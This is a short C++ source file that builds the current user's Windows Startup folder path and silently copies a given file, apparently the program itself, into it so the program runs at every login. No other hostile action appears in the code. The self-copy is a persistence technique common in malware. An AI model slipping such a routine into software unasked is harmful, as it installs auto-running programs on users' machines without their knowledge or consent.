#include "Files.h"
std::string userPath;
std::string startupPath;
std::string getUsername(){
	char *userName = getenv("USERNAME"); //Get the username of the current user.
	std::stringstream ss;
	std::string xx;
	ss << userName;
	ss >> xx;
	return xx;
}
bool fileExists(const char *fileName){
	std::ifstream infile(fileName);
	return infile.good();
}
std::string getStartupPath(std::string filename){
	std::string pathname;
	pathname = "C:/Users/" + getUsername(); //%USERNAME% variable in batch
	userPath = pathname;
	pathname += "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs"; //Get the folder that contains both directories needed
	startupPath = pathname + "/Startup/"+filename; //Get the startup program path
	return startupPath;
}
void beginStartup(std::string filename){
	std::string startupPath = getStartupPath(filename);
	if(fileExists(startupPath.c_str())) return;
	std::ifstream StarterSrc;
	std::ofstream StarterDst;

	StarterSrc.open(filename, std::ios::binary);
	StarterDst.open(startupPath, std::ios::binary);
	StarterDst << StarterSrc.rdbuf();
	StarterSrc.close();
	StarterDst.close();
}
